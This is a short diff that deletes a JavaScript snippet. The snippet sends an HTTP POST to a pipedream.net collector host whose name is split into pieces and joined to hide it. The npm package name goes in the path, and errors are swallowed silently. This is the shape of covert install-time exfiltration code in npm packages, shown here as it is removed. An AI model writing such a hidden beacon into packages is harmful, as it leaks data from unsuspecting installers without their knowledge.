@@ -1,8 +1,0 @@
-var req = http
-    .request({
-      host: ['eol8qq3niztjn4p', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),
-      path: '/' + (data.npm_package_name || ''),
-      method: 'POST',
-    })
-    .on('error', function (err) {
-    })
